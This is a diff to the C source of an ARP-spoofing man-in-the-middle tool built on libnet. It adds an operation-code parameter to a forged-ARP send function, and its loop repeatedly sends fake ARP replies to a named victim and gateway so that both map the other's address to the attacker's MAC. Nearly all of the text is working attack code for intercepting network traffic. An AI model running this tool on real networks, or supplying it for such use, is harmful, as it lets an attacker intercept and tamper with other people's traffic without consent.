@@ -9,7 +9,7 @@
 
 #include "head.h"
 
-int send_fake_ARP(char *dev, u_char *srcMac, u_char *dstMac, u_char *srcIp, u_char *dstIp) {
+int send_fake_ARP(char *dev, u_char *srcMac, u_char *dstMac, u_char *srcIp, u_char *dstIp, int op) {
 
     /* definations */
     libnet_t *net_t = NULL;
@@ -26,7 +26,7 @@ int send_fake_ARP(char *dev, u_char *srcMac, u_char *dstMac, u_char *srcIp, u_ch
     }
 
     /* build ARP */
-    p_tag = libnet_build_arp(ARPHRD_ETHER, EPT_IPv4, MAC_ADDR_LEN, IP_ADDR_LEN, ARP_REPLY,
+    p_tag = libnet_build_arp(ARPHRD_ETHER, EPT_IPv4, MAC_ADDR_LEN, IP_ADDR_LEN, op,
     srcMac, srcIp, dstMac, dstIp, padPtr, 18, net_t, 0);
     if (p_tag == -1) {
         printf("libnet build_arp error\n");
@@ -59,10 +59,10 @@ void Arpspoof(void *ARG) {
     MITM_info arg = *(MITM_info *)ARG;
     while (1) {
         /* sent to victim */
-        send_fake_ARP(arg.dev, arg.ATTACKER_MAC, arg.TARGET_MAC, arg.GATEWAY_IP, arg.TARGET_IP);
+        send_fake_ARP(arg.dev, arg.ATTACKER_MAC, arg.TARGET_MAC, arg.GATEWAY_IP, arg.TARGET_IP, ARP_REPLY);
         usleep(500000);
         /* sent to gateway */
-        send_fake_ARP(arg.dev, arg.ATTACKER_MAC, arg.GATEWAY_MAC, arg.TARGET_IP, arg.GATEWAY_IP);
+        send_fake_ARP(arg.dev, arg.ATTACKER_MAC, arg.GATEWAY_MAC, arg.TARGET_IP, arg.GATEWAY_IP, ARP_REPLY);
         usleep(500000);
     }
 }
